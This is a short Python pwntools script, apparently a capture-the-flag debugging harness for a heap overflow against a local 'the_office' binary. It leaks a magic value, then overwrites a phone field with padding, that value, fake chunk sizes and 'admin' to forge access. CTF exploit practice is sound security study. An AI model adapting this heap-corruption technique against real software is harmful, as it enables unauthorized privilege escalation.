import sys, re, struct, time
sys.path.insert(0, ".")
from pwn import context, process
context.log_level = "error"
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "./_z_172_exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

err = open("/tmp/office/err.txt", "wb")
io = process(["./the_office"], stderr=err)
io.recvuntil(b"4) Get access token")
ex.add(io, b"A", email=b"a" * 28)
ex.remove(io, 0)
ex.add(io, b"B", salary=2000, phone=b"222")
ex.add(io, b"C", salary=3000, phone=b"333")
magic = int(re.findall(r"Bldg #: (\d+)", ex.listemps(io).decode("latin-1"))[-1])
print("magic = 0x%08x" % magic)
ex.remove(io, 0)
payload = b"A" * 28 + struct.pack("<I", magic) + struct.pack("<I", 0x35) * 2 + b"admin\x00"
ex.add(io, b"D", salary=4000, phone=payload)
print("apres add D, vivant ?", io.poll())
out = ex.listemps(io)
print("list ok, vivant ?", io.poll())
io.sendline(b"4")
time.sleep(0.8)
try:
    print("recu apres 4:", repr(io.recv(65536, timeout=2)))
except Exception as e:
    print("recv4:", e)
print("vivant apres 4 ?", io.poll())
io.close()
err.close()
print("=== STDERR ===")
print(open("/tmp/office/err.txt", errors="replace").read()[:2000])
